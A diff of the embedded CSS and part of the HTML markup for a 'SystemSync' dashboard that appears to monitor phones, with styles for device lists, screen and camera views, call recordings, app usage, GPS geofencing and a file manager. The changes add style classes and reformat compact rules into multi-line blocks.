@@ -32,6 +32,185 @@
             --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
             --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
             --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.08);
+            --glass-bg: rgba(255, 255, 255, 0.65);
+            --glass-border: rgba(255, 255, 255, 0.4);
+        }
+
+        .overview-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 24px;
+        }
+
+        .stat-card-premium {
+            background: white;
+            padding: 24px;
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--border);
+            box-shadow: var(--shadow-sm);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            border-bottom: 4px solid var(--primary);
+        }
+
+        .stat-card-premium:hover {
+            transform: translateY(-6px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .live-pulse {
+            width: 10px;
+            height: 10px;
+            background: #10b981;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 12px;
+            box-shadow: 0 0 0 rgba(16, 185, 129, 0.4);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ========== Premium GPS & Geofence Styles ========== */
+        .premium-panel {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: var(--radius-lg);
+            padding: 24px;
+            box-shadow: var(--shadow-lg);
+            margin-bottom: 24px;
+        }
+
+        .gps-stat-card {
+            background: white;
+            padding: 16px;
+            border-radius: var(--radius-md);
+            border: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .gps-stat-card .label {
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--text-sec);
+            text-transform: uppercase;
+        }
+
+        .gps-stat-card .value {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-main);
+        }
+
+        .radius-slider-container {
+            margin: 20px 0;
+            padding: 16px;
+            background: #f8fafc;
+            border-radius: var(--radius-md);
+        }
+
+        .radius-slider-container label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: var(--text-sec);
+        }
+
+        input[type="range"].premium-slider {
+            width: 100%;
+            height: 6px;
+            background: #e2e8f0;
+            border-radius: 5px;
+            outline: none;
+            -webkit-appearance: none;
+        }
+
+        input[type="range"].premium-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 20px;
+            height: 20px;
+            background: var(--primary);
+            border-radius: 50%;
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(15, 98, 254, 0.3);
+        }
+
+        .history-timeline-item {
+            position: relative;
+            padding: 16px 16px 16px 40px;
+            border-bottom: 1px solid var(--border);
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .history-timeline-item:hover {
+            background: #f1f5f9;
+        }
+
+        .history-timeline-item::before {
+            content: '';
+            position: absolute;
+            left: 18px;
+            top: 24px;
+            bottom: -10px;
+            width: 2px;
+            background: #e2e8f0;
+        }
+
+        .history-timeline-item:last-child::before {
+            display: none;
+        }
+
+        .history-timeline-item::after {
+            content: '';
+            position: absolute;
+            left: 14px;
+            top: 20px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--primary);
+            border: 2px solid white;
+            box-shadow: 0 0 0 2px rgba(15, 98, 254, 0.1);
+        }
+
+        .premium-table th {
+            cursor: pointer;
+            transition: all 0.2s;
+            position: relative;
+            background: #f8fafc;
+            padding: 14px 16px;
+            border-bottom: 2px solid var(--border);
+        }
+
+        .premium-table th:hover {
+            background: #f1f5f9;
+            color: var(--primary);
+        }
+
+        .sort-indicator {
+            font-size: 14px;
+            margin-left: 6px;
+            display: inline-block;
+            vertical-align: middle;
+            color: var(--primary);
+            font-weight: 700;
         }
 
         * {
@@ -167,8 +346,15 @@
         }
 
         @keyframes slideDown {
-            from { opacity: 0; transform: translateY(-5px); }
-            to { opacity: 1; transform: translateY(0); }
+            from {
+                opacity: 0;
+                transform: translateY(-5px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .camera-option {
@@ -374,9 +560,17 @@
             vertical-align: middle;
         }
 
-        tr:last-child td { border-bottom: none; }
-        tbody tr { transition: background 0.15s; }
-        tbody tr:hover { background: #f8fafc; }
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tbody tr {
+            transition: background 0.15s;
+        }
+
+        tbody tr:hover {
+            background: #f8fafc;
+        }
 
         .pagination {
             margin-top: 20px;
@@ -427,8 +621,15 @@
         }
 
         @keyframes fadeInScale {
-            from { opacity: 0; transform: translateY(20px) scale(0.95); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
+            from {
+                opacity: 0;
+                transform: translateY(20px) scale(0.95);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
         }
 
         #authBox h2,
@@ -552,6 +753,20 @@
             font-family: monospace;
         }
 
+        .device-arrow {
+            color: var(--primary);
+            font-size: 20px;
+            font-weight: bold;
+            opacity: 0;
+            transform: translateX(-10px);
+            transition: 0.2s;
+        }
+
+        .device-item:hover .device-arrow {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
         /* File Manager Tree View */
         .file-toolbar-sticky {
             position: sticky;
@@ -566,119 +781,707 @@
             margin-bottom: 16px;
         }
 
-        .tree-root { list-style: none; padding-left: 0; }
-        .tree-children { display: grid; grid-template-rows: 0fr; transition: grid-template-rows 0.3s ease-out; }
-        .tree-children.expanded { grid-template-rows: 1fr; }
-        .tree-children-inner { overflow: hidden; padding-left: 20px; list-style: none; border-left: 1px dashed var(--border); margin-left: 10px; padding-top: 4px; padding-bottom: 4px; }
-        .folder-header, .file-row { display: flex; align-items: center; padding: 8px 12px; border-radius: var(--radius-sm); cursor: pointer; transition: 0.15s; border: 1px solid transparent; position: relative; }
-        .folder-header:hover, .file-row:hover { background: #f8fafc; border-color: var(--border); }
-        .folder-icon { font-size: 18px; margin-right: 12px; width: 24px; text-align: center; color: #fbbf24; }
-        .file-icon { font-size: 18px; margin-right: 12px; width: 24px; text-align: center; color: #94a3b8; }
-        .chevron { font-size: 12px; margin-right: 8px; transition: transform 0.3s; color: var(--text-sec); display: inline-block; width: 12px; }
-        .chevron.down { transform: rotate(90deg); }
-        .item-name { font-size: 14px; font-weight: 500; color: var(--text-main); flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; user-select: none; }
-        .file-size { font-size: 12px; color: var(--text-sec); margin-left: 10px; }
-        .file-actions { opacity: 0; transition: opacity 0.2s; margin-left: 16px; display: inline-flex; gap: 6px; }
-        .file-row:hover .file-actions { opacity: 1; }
-        .file-action-btn { background: #fff; border: 1px solid var(--border); border-radius: 4px; padding: 4px 8px; font-size: 12px; cursor: pointer; transition: 0.2s; display: inline-flex; align-items: center; }
-        .file-action-btn:hover { background: #f1f5f9; box-shadow: var(--shadow-sm); }
-        .file-action-btn.dl:hover { color: var(--primary); border-color: var(--primary); }
-        .file-action-btn.del:hover { color: var(--danger); border-color: var(--danger); }
-        .file-checkbox { margin-right: 10px; width: 18px; height: 18px; cursor: pointer; }
-
-        #map, #historyMap { border-radius: var(--radius-md); box-shadow: var(--shadow-sm); border: 1px solid var(--border); }
-        .map-info { position: absolute; top: 20px; left: 20px; background: rgba(255,255,255,0.95); backdrop-filter: blur(8px); padding: 12px 16px; border-radius: var(--radius-sm); font-size: 13px; font-weight: 500; border-left: 4px solid var(--primary); z-index: 1000; box-shadow: var(--shadow-md); max-width: 280px; }
-        .current-location-marker { background: #0f62fe; border-radius: 50%; width: 14px; height: 14px; border: 2px solid white; box-shadow: 0 0 0 4px rgba(15,98,254,0.3); }
-
-        .btn-ui { padding: 8px 16px; font-size: 14px; font-weight: 500; border-radius: var(--radius-sm); cursor: pointer; transition: 0.2s; border: none; display: inline-flex; align-items: center; gap: 6px; }
-        .btn-ui.primary { background: var(--primary); color: white; }
-        .btn-ui.primary:hover { background: var(--primary-hover); box-shadow: 0 4px 10px rgba(15,98,254,0.2); transform: translateY(-1px); }
-        .btn-ui.secondary { background: #f1f5f9; color: var(--text-main); border: 1px solid #cbd5e1; }
-        .btn-ui.secondary:hover { background: #e2e8f0; }
-
-        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(4px); display: none; justify-content: center; align-items: center; z-index: 10000; animation: fadeIn 0.2s; }
-        .modal-overlay.show { display: flex; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .mobile-popup { width: min(92vw, calc(92vh * 9 / 16)); height: min(92vh, calc(92vw * 16 / 9)); display: flex; flex-direction: column; background: #000; border-radius: var(--radius-lg); border: 1px solid #333; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
-        .phone-frame { flex: 1; min-height: 0; background: black; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .phone-frame video { width: 100%; height: 100%; object-fit: contain; }
-        .popup-controls { flex-shrink: 0; background: #111; padding: 16px; display: flex; gap: 12px; justify-content: center; }
-        .popup-controls button { width: 48px; height: 48px; background: #222; color: white; border: none; border-radius: 50%; cursor: pointer; font-size: 20px; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
-        .popup-controls button:hover { background: #333; transform: scale(1.05); }
-        .popup-controls button.close-btn { background: var(--danger); }
-        .popup-controls button.close-btn:hover { background: #b91c1c; }
-
-        #downloadProgress { background: white; border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 16px; margin: 0 24px 16px; display: none; box-shadow: var(--shadow-sm); }
-        #progressBar { width: 0%; height: 8px; background: var(--primary); border-radius: 4px; transition: width 0.3s; }
-
-        .app-usage-item { display: flex; align-items: center; padding: 14px; border-bottom: 1px solid #eef2f5; gap: 16px; }
-        .app-usage-name { flex: 1; font-weight: 500; font-size: 14px; }
-        .app-usage-time { width: 100px; text-align: right; color: var(--text-sec); font-size: 13px; font-family: monospace; }
-        .usage-bar-container { flex: 2; height: 24px; background: #f1f5f9; border-radius: 12px; overflow: hidden; }
-        .usage-bar { height: 100%; border-radius: 12px; transition: width 0.3s; display: flex; align-items: center; justify-content: flex-end; padding-right: 12px; color: white; font-size: 11px; font-weight: 600; }
-
-        .event-card { background: white; border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 16px; margin-bottom: 12px; display: flex; align-items: center; gap: 16px; transition: 0.2s; }
-        .event-card:hover { transform: translateY(-2px); box-shadow: var(--shadow-sm); }
-        .event-icon { font-size: 32px; width: 48px; height: 48px; background: #f8fafc; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
-        .event-details { flex: 1; }
-        .event-title { font-weight: 600; font-size: 15px; color: var(--text-main); }
-        .event-meta { font-size: 12px; color: var(--text-sec); margin-top: 6px; font-weight: 500; }
-
-        .geofence-controls { margin-top: 16px; display: flex; gap: 12px; flex-wrap: wrap; }
-        .geofence-controls button { padding: 10px 20px; color: white; border: none; border-radius: var(--radius-sm); cursor: pointer; width: auto; font-weight: 500; transition: 0.2s; }
-
-        #alertsBadge { background: var(--danger-bg); border: 1px solid #fca5a5; border-radius: var(--radius-sm); padding: 16px; margin-top: 16px; }
-        .ws-debug { font-size: 11px; color: #94a3b8; margin-top: auto; padding-top: 20px; text-align: center; }
-
-        .call-recording-card { background: white; border: 1px solid var(--border); border-radius: var(--radius-md); padding: 16px; margin-bottom: 12px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px; transition: 0.2s; }
-        .call-recording-card:hover { transform: translateY(-2px); box-shadow: var(--shadow-sm); }
-        .call-recording-info { flex: 1; }
-        .call-recording-direction { font-size: 20px; margin-right: 8px; }
-        .call-recording-number { font-weight: 600; font-size: 15px; }
-        .call-recording-details { font-size: 12px; color: var(--text-sec); margin-top: 4px; }
-        .download-recording-btn { background: var(--primary); color: white; border: none; padding: 8px 16px; border-radius: var(--radius-sm); cursor: pointer; font-weight: 500; transition: 0.2s; }
-        .download-recording-btn:hover { background: var(--primary-hover); transform: scale(1.02); }
-
-        .map-type-toggle { position: absolute; bottom: 20px; right: 20px; z-index: 1000; background: white; padding: 8px 12px; border-radius: var(--radius-sm); box-shadow: var(--shadow-sm); cursor: pointer; font-size: 12px; font-weight: 500; border: 1px solid var(--border); }
-        .map-type-toggle:hover { background: #f0f4f8; }
-        .follow-checkbox { position: absolute; bottom: 20px; right: 140px; z-index: 1000; background: white; padding: 8px 12px; border-radius: var(--radius-sm); box-shadow: var(--shadow-sm); font-size: 12px; font-weight: 500; border: 1px solid var(--border); display: flex; align-items: center; gap: 6px; cursor: pointer; }
-        .follow-checkbox:hover { background: #f0f4f8; }
-        .date-selector { display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap; }
-
-        @media (max-width: 768px) {
-            #sidebar { position: fixed; top: 0; left: 0; bottom: 0; transform: translateX(-100%); z-index: 1000; box-shadow: var(--shadow-lg); width: 280px; }
-            #sidebar.open { transform: translateX(0); }
-            #sidebarCloseBtn { display: flex; }
-            #menuBtn { display: block; }
-            #sidebarOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); z-index: 99; }
-            #sidebarOverlay.show { display: block; }
-            #serverInfo { display: none; }
-            #content { padding: 16px; }
-            #main-panel { padding: 20px; }
+        .tree-root {
+            list-style: none;
+            padding-left: 0;
         }
 
-        /* Tree view for file manager */
-        ul.tree, ul.tree ul { list-style-type: none; margin: 0; padding: 0; }
-        .tree-item { display: flex; align-items: center; padding: 6px 8px; border-radius: 6px; cursor: pointer; gap: 8px; margin-bottom: 2px; transition: background 0.2s; }
-        .tree-item:hover { background: #e3f2fd; }
-        .caret { cursor: pointer; user-select: none; display: inline-block; transition: 0.3s transform; width: 16px; text-align: center; font-size: 10px; color: #7b8a9b; }
-        .caret-down { transform: rotate(90deg); }
-        ul.tree ul.nested { display: none; padding-left: 32px; border-left: 1px dashed #76b4f3; margin-left: 20px; }
-        ul.tree ul.nested.active { display: block; animation: slideDown 0.3s ease-out; }
-        .folder-name, .file-name { flex: 1; font-size: 14px; color: #1a2634; }
-        .folder-name { color: #1976ff; font-weight: 500; }
-        .download-selected { margin-top: 15px; text-align: right; position: sticky; bottom: 0; background: white; padding: 10px 0 0 0; border-top: 1px solid #eef2f5; }
-        .download-selected button { width: auto; padding: 8px 16px; background: #1976ff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 500; }
-        .download-selected button:hover { background: #0d5bca; }
+        .tree-children {
+            display: grid;
+            grid-template-rows: 0fr;
+            transition: grid-template-rows 0.3s ease-out;
+        }
+
+        .tree-children.expanded {
+            grid-template-rows: 1fr;
+        }
+
+        .tree-children-inner {
+            overflow: hidden;
+            padding-left: 20px;
+            list-style: none;
+            border-left: 1px dashed var(--border);
+            margin-left: 10px;
+            padding-top: 4px;
+            padding-bottom: 4px;
+        }
+
+        .folder-header,
+        .file-row {
+            display: flex;
+            align-items: center;
+            padding: 8px 12px;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            transition: 0.15s;
+            border: 1px solid transparent;
+            position: relative;
+        }
+
+        .folder-header:hover,
+        .file-row:hover {
+            background: #f8fafc;
+            border-color: var(--border);
+        }
+
+        .folder-icon {
+            font-size: 18px;
+            margin-right: 12px;
+            width: 24px;
+            text-align: center;
+            color: #fbbf24;
+        }
+
+        .file-icon {
+            font-size: 18px;
+            margin-right: 12px;
+            width: 24px;
+            text-align: center;
+            color: #94a3b8;
+        }
+
+        .chevron {
+            font-size: 12px;
+            margin-right: 8px;
+            transition: transform 0.3s;
+            color: var(--text-sec);
+            display: inline-block;
+            width: 12px;
+        }
+
+        .chevron.down {
+            transform: rotate(90deg);
+        }
+
+        .item-name {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--text-main);
+            flex: 1;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            user-select: none;
+        }
+
+        .file-size {
+            font-size: 12px;
+            color: var(--text-sec);
+            margin-left: 10px;
+        }
+
+        .file-actions {
+            opacity: 0;
+            transition: opacity 0.2s;
+            margin-left: 16px;
+            display: inline-flex;
+            gap: 6px;
+        }
+
+        .file-row:hover .file-actions {
+            opacity: 1;
+        }
+
+        .file-action-btn {
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 4px 8px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: 0.2s;
+            display: inline-flex;
+            align-items: center;
+        }
+
+        .file-action-btn:hover {
+            background: #f1f5f9;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .file-action-btn.dl:hover {
+            color: var(--primary);
+            border-color: var(--primary);
+        }
+
+        .file-action-btn.del:hover {
+            color: var(--danger);
+            border-color: var(--danger);
+        }
+
+        /* New checkbox style */
+        .file-checkbox {
+            margin-right: 10px;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+
+        #map,
+        #historyMap {
+            border-radius: var(--radius-md);
+            box-shadow: var(--shadow-sm);
+            border: 1px solid var(--border);
+        }
+
+        .map-info {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(8px);
+            padding: 12px 16px;
+            border-radius: var(--radius-sm);
+            font-size: 13px;
+            font-weight: 500;
+            border-left: 4px solid var(--primary);
+            z-index: 1000;
+            box-shadow: var(--shadow-md);
+            max-width: 280px;
+        }
+
+        .current-location-marker {
+            background: #0f62fe;
+            border-radius: 50%;
+            width: 14px;
+            height: 14px;
+            border: 2px solid white;
+            box-shadow: 0 0 0 4px rgba(15, 98, 254, 0.3);
+        }
+
+        .btn-ui {
+            padding: 8px 16px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            transition: 0.2s;
+            border: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .btn-ui.primary {
+            background: var(--primary);
+            color: white;
+        }
+
+        .btn-ui.primary:hover {
+            background: var(--primary-hover);
+            box-shadow: 0 4px 10px rgba(15, 98, 254, 0.2);
+            transform: translateY(-1px);
+        }
+
+        .btn-ui.secondary {
+            background: #f1f5f9;
+            color: var(--text-main);
+            border: 1px solid #cbd5e1;
+        }
+
+        .btn-ui.secondary:hover {
+            background: #e2e8f0;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            background: #e2e8f0;
+            color: #475569;
+        }
+
+        .badge.blue {
+            background: #eff6ff;
+            color: #1d4ed8;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(4px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            animation: fadeIn 0.2s;
+        }
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .mobile-popup {
+            width: min(92vw, calc(92vh * 9 / 16));
+            height: min(92vh, calc(92vw * 16 / 9));
+            display: flex;
+            flex-direction: column;
+            background: #000;
+            border-radius: var(--radius-lg);
+            border: 1px solid #333;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .phone-frame {
+            flex: 1;
+            min-height: 0;
+            background: black;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .phone-frame video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .popup-controls {
+            flex-shrink: 0;
+            background: #111;
+            padding: 16px;
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+
+        .popup-controls button {
+            width: 48px;
+            height: 48px;
+            background: #222;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.2s;
+        }
+
+        .popup-controls button:hover {
+            background: #333;
+            transform: scale(1.05);
+        }
+
+        .popup-controls button.close-btn {
+            background: var(--danger);
+        }
+
+        .popup-controls button.close-btn:hover {
+            background: #b91c1c;
+        }
+
+        #downloadProgress {
+            background: white;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 16px;
+            margin: 0 24px 16px;
+            display: none;
+            box-shadow: var(--shadow-sm);
+        }
+
+        #progressBar {
+            width: 0%;
+            height: 8px;
+            background: var(--primary);
+            border-radius: 4px;
+            transition: width 0.3s;
+        }
+
+        .app-usage-item {
+            display: flex;
+            align-items: center;
+            padding: 14px;
+            border-bottom: 1px solid #eef2f5;
+            gap: 16px;
+        }
+
+        .app-usage-name {
+            flex: 1;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .app-usage-time {
+            width: 100px;
+            text-align: right;
+            color: var(--text-sec);
+            font-size: 13px;
+            font-family: monospace;
+        }
+
+        .usage-bar-container {
+            flex: 2;
+            height: 24px;
+            background: #f1f5f9;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .usage-bar {
+            height: 100%;
+            border-radius: 12px;
+            transition: width 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding-right: 12px;
+            color: white;
+            font-size: 11px;
+            font-weight: 600;
+        }
+
+        .event-card {
+            background: white;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 16px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            transition: 0.2s;
+        }
+
+        .event-card:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-sm);
+        }
+
+        .event-icon {
+            font-size: 32px;
+            width: 48px;
+            height: 48px;
+            background: #f8fafc;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .event-details {
+            flex: 1;
+        }
+
+        .event-title {
+            font-weight: 600;
+            font-size: 15px;
+            color: var(--text-main);
+        }
+
+        .event-meta {
+            font-size: 12px;
+            color: var(--text-sec);
+            margin-top: 6px;
+            font-weight: 500;
+        }
+
+        .geofence-controls {
+            margin-top: 16px;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .geofence-controls button {
+            padding: 10px 20px;
+            color: white;
+            border: none;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            width: auto;
+            font-weight: 500;
+            transition: 0.2s;
+        }
+
+        #alertsBadge {
+            background: var(--danger-bg);
+            border: 1px solid #fca5a5;
+            border-radius: var(--radius-sm);
+            padding: 16px;
+            margin-top: 16px;
+        }
+
+        .ws-debug {
+            font-size: 11px;
+            color: #94a3b8;
+            margin-top: auto;
+            padding-top: 20px;
+            text-align: center;
+        }
+
+        .call-recording-card {
+            background: white;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-md);
+            padding: 16px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 12px;
+            transition: 0.2s;
+        }
+
+        .call-recording-card:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-sm);
+        }
+
+        .call-recording-info {
+            flex: 1;
+        }
+
+        .call-recording-direction {
+            font-size: 20px;
+            margin-right: 8px;
+        }
+
+        .call-recording-number {
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        .call-recording-details {
+            font-size: 12px;
+            color: var(--text-sec);
+            margin-top: 4px;
+        }
+
+        .download-recording-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            font-weight: 500;
+            transition: 0.2s;
+        }
+
+        .download-recording-btn:hover {
+            background: var(--primary-hover);
+            transform: scale(1.02);
+        }
+
+        /* Map type toggle button */
+        .map-type-toggle {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1000;
+            background: white;
+            padding: 8px 12px;
+            border-radius: var(--radius-sm);
+            box-shadow: var(--shadow-sm);
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 500;
+            border: 1px solid var(--border);
+        }
+
+        .map-type-toggle:hover {
+            background: #f0f4f8;
+        }
+
+        /* Follow checkbox */
+        .follow-checkbox {
+            position: absolute;
+            bottom: 20px;
+            right: 140px;
+            z-index: 1000;
+            background: white;
+            padding: 8px 12px;
+            border-radius: var(--radius-sm);
+            box-shadow: var(--shadow-sm);
+            font-size: 12px;
+            font-weight: 500;
+            border: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+        }
+
+        .follow-checkbox:hover {
+            background: #f0f4f8;
+        }
+
+        /* Date selector for screen time */
+        .date-selector {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+        }
+
+        @media (max-width: 768px) {
+            #sidebar {
+                position: fixed;
+                top: 0;
+                left: 0;
+                bottom: 0;
+                transform: translateX(-100%);
+                z-index: 1000;
+                box-shadow: var(--shadow-lg);
+                width: 280px;
+            }
+
+            #sidebar.open {
+                transform: translateX(0);
+            }
+
+            #sidebarCloseBtn {
+                display: flex;
+            }
+
+            #menuBtn {
+                display: block;
+            }
+
+            #sidebarOverlay {
+                display: none;
+                position: fixed;
+                inset: 0;
+                background: rgba(0, 0, 0, 0.5);
+                backdrop-filter: blur(4px);
+                z-index: 99;
+            }
+
+            #sidebarOverlay.show {
+                display: block;
+            }
+
+            #serverInfo {
+                display: none;
+            }
+
+            #content {
+                padding: 16px;
+            }
+
+            #main-panel {
+                padding: 20px;
+            }
+        }
+
+        /* Tree view for file manager (from index (16).html) */
+        ul.tree,
+        ul.tree ul {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+        }
+
+        .tree-item {
+            display: flex;
+            align-items: center;
+            padding: 6px 8px;
+            border-radius: 6px;
+            cursor: pointer;
+            gap: 8px;
+            margin-bottom: 2px;
+            transition: background 0.2s;
+        }
+
+        .tree-item:hover {
+            background: #e3f2fd;
+        }
+
+        .caret {
+            cursor: pointer;
+            user-select: none;
+            display: inline-block;
+            transition: 0.3s transform;
+            width: 16px;
+            text-align: center;
+            font-size: 10px;
+            color: #7b8a9b;
+        }
+
+        .caret-down {
+            transform: rotate(90deg);
+        }
+
+        ul.tree ul.nested {
+            display: none;
+            padding-left: 32px;
+            border-left: 1px dashed #76b4f3;
+            margin-left: 20px;
+        }
+
+        ul.tree ul.nested.active {
+            display: block;
+            animation: slideDown 0.3s ease-out;
+        }
+
+        .folder-name,
+        .file-name {
+            flex: 1;
+            font-size: 14px;
+            color: #1a2634;
+        }
+
+        .folder-name {
+            color: #1976ff;
+            font-weight: 500;
+        }
+
+        .download-selected {
+            margin-top: 15px;
+            text-align: right;
+            position: sticky;
+            bottom: 0;
+            background: white;
+            padding: 10px 0 0 0;
+            border-top: 1px solid #eef2f5;
+        }
+
+        .download-selected button {
+            width: auto;
+            padding: 8px 16px;
+            background: #1976ff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .download-selected button:hover {
+            background: #0d5bca;
+        }
     </style>
 </head>
 
 <body>
-    <!-- All HTML structure (sidebar, modals, etc.) remains exactly as in index1 -->
     <div id="sidebarOverlay" onclick="closeSidebar()"></div>
     <div id="authContainer">
         <div id="authBox">
-            <h2 id="authModeTitle">🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email Address" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button id="authBtn">Sign In</button>
+            <h2 id="authModeTitle">🔐 SystemSync Login</h2><input type="email" id="authEmail"
+                placeholder="Email Address" /><input type="password" id="authPassword" placeholder="Password" /><input
+                type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button
+                id="authBtn">Sign In</button>
             <div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div>
             <div id="authError"></div>
         </div>
@@ -686,45 +1489,64 @@
     <div id="deviceListContainer" style="display:none;">
         <div id="deviceListBox">
             <h2>📱 Your Devices</h2>
-            <div id="deviceList" style="max-height: 400px; overflow-y: auto; padding-right: 4px; margin-bottom: 20px;"></div><button id="logoutBtn">Logout</button>
+            <div id="deviceList" style="max-height: 400px; overflow-y: auto; padding-right: 4px; margin-bottom: 20px;">
+            </div><button id="logoutBtn">Logout</button>
         </div>
     </div>
     <div id="screenModalOverlay" class="modal-overlay">
         <div class="mobile-popup">
             <div class="phone-frame"><video id="modalScreenVideo" autoplay playsinline></video></div>
-            <div class="popup-controls"><button id="modalSnapBtn">📸</button><button id="modalRecordBtn">🔴</button><button id="modalFullscreenBtn">⛶</button><button id="modalCloseBtn" class="close-btn">✕</button></div>
+            <div class="popup-controls"><button id="modalSnapBtn">📸</button><button
+                    id="modalRecordBtn">🔴</button><button id="modalFullscreenBtn">⛶</button><button id="modalCloseBtn"
+                    class="close-btn">✕</button></div>
         </div>
     </div>
     <div id="cameraModalOverlay" class="modal-overlay">
         <div class="mobile-popup">
             <div class="phone-frame"><video id="modalCameraVideo" autoplay playsinline></video></div>
